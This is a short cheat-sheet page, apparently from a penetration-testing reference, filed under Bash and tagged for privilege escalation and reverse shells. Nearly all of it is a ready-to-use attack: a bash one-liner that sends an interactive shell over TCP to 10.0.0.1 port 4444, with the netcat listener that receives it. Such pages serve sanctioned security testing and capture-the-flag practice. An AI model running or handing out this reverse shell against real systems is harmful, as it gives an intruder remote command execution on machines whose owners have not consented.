---
title: Bash
desc: Executes shell commands and scripts. It also used to Reverse Shell, etc.
tags: [Linux, PrivEsc, ReverseShell, SUID]
alts: [BashScript]
website:
render_with_liquid: false
---

## Reverse Shell TCP

```sh
# TCP (ex. port: 4444)
bash -i >&  /dev/tcp/10.0.0.1/4444 0>&1

-------------------------------------------

# Listen
nc -lvnp 4444
```
